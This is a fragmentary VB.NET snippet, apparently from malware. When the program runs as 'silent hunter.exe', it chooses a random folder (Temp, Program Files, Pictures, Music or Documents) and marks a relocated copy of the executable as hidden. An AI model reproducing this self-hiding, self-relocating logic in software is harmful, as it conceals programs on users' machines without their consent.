            ...
            If runApplication = False Then
                If Application.ExecutablePath.ToLower.EndsWith("silent hunter.exe") = True Then
                    Try
                        ...
                        Dim folders As String() = New String() {My.Computer.FileSystem.SpecialDirectories.Temp, My.Computer.FileSystem.SpecialDirectories.ProgramFiles, My.Computer.FileSystem.SpecialDirectories.MyPictures, My.Computer.FileSystem.SpecialDirectories.MyMusic, My.Computer.FileSystem.SpecialDirectories.MyDocuments}

                        MyValue = CInt(Int((5 * Rnd()) + 1))
                        ...
                        File.SetAttributes(newexecutablepath, FileAttributes.Hidden)
                        File.SetAttributes(newexecutablename, FileAttributes.Hidden)
